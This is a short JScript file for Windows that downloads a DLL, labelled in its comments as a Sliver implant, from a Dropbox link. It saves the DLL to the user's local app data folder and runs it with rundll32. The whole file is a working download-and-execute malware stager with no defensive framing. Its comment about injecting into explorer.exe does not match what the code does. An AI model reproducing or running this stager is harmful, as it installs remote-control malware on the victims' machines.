var objShell = new ActiveXObject("WScript.Shell");

// Download the Sliver DLL
var url = "https://www.dropbox.com/scl/fi/1vos32664821c9kwu4rrv/ANCIENT_CANVAS.dll?rlkey=ssokz83a932t4arjja976bto7&st=e83e72qh&dl=1";
var target = "%LOCALAPPDATA%\\DownloadedFolder\\ANCIENT_CANVAS.dll";

var xhr = new ActiveXObject("MSXML2.XMLHTTP");
xhr.open("GET", url, false);
xhr.send();

var stream = new ActiveXObject("ADODB.Stream");
stream.Type = 1;
stream.Open();
stream.Write(xhr.responseBody);
stream.SaveToFile(target, 2);
stream.Close();

// Inject the DLL into explorer.exe using rundll32
objShell.Run("rundll32.exe " + target + ",#1");
